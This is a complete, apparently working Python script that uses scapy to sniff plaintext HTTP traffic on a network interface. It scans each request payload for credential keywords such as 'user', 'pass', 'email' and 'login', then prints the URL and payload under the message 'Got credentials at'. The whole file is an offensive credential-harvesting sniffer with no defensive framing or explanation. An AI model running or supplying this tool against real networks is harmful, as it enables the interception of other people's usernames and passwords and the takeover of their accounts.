#!/usr/bin/python3

import sys, argparse, cgi
import scapy.all as scapy
from scapy_http import http

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

WORDS = ["user", "usr", "username", "name", "pass", "pwd", "password", "email", "mail", "login"]

def sniffer(packet):
    if packet.haslayer(http.HTTPRequest):
        req = packet[http.HTTPRequest]
        url = str(req.Host.decode()) + str(req.Path.decode())
        
        if packet.haslayer(scapy.Raw):
            payload = str(packet[scapy.Raw].load.decode())

            for w in WORDS:
                if w in payload.lower():
                    print(bcolors.FAIL + "[+] Got credentials at: %s\n%s" % (url, payload) + bcolors.ENDC)
                    break

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", help="The interface you want to sniff.", default="eth0", type=str, required=False)
    args = parser.parse_args()

    interface = args.i

    try:
        print("[*] Sniffing HTTP traffic...")
        scapy.sniff(iface=interface, store=False, prn=sniffer)
    except KeyboardInterrupt:
        print("Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
